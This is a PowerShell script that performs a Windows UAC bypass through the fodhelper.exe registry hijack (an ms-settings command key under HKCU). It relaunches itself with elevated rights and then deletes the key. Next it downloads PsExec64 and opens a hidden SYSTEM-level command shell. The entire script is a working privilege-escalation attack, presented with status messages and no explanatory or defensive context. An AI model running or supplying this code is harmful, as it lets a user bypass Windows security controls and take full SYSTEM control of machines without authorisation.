$CurrentIdentity = [Security.Principal.WindowsIdentity]::GetCurrent()
$Principal = New-Object Security.Principal.WindowsPrincipal($CurrentIdentity)

if (-not $Principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "[*] Elevating via fodhelper..." -ForegroundColor Yellow
    
    $RegPath = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
    $Command = "powershell.exe -ExecutionPolicy Bypass -NoExit -File `"$PSCommandPath`""
    
    New-Item -Path $RegPath -Force | Out-Null
    New-ItemProperty -Path $RegPath -Name "DelegateExecute" -Value "" -Force | Out-Null
    Set-ItemProperty -Path $RegPath -Name "(Default)" -Value $Command | Out-Null
    
    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
    Start-Sleep -Seconds 2
    Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue
    exit
}

Write-Host "[+] Running as Administrator" -ForegroundColor Green
Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue

$PsExecPath = "$env:TEMP\PsExec64.exe"

if (-not (Test-Path $PsExecPath)) {
    Write-Host "[*] Downloading PsExec64..." -ForegroundColor Cyan
    try {
        Invoke-WebRequest -Uri "https://live.sysinternals.com/PsExec64.exe" -OutFile $PsExecPath -UseBasicParsing
        Write-Host "[+] Downloaded!" -ForegroundColor Green
    } catch {
        Write-Host "[-] Download failed: $_" -ForegroundColor Red
        Write-Host "`nPress any key to exit..." -ForegroundColor Cyan
        $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        exit
    }
} else {
    Write-Host "[+] PsExec64 already exists" -ForegroundColor Green
}

Write-Host "[*] Spawning SYSTEM shell..." -ForegroundColor Cyan

Start-Process -FilePath $PsExecPath -ArgumentList "-accepteula -i -s -d cmd.exe /k title SYSTEM SHELL && color 0a && whoami" -WindowStyle Hidden

Start-Sleep -Seconds 2
Write-Host "[+] SYSTEM CMD launched!" -ForegroundColor Green
Write-Host "[!] Check your taskbar for green CMD!" -ForegroundColor Magenta

Write-Host "`nPress any key to exit..." -ForegroundColor Cyan
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
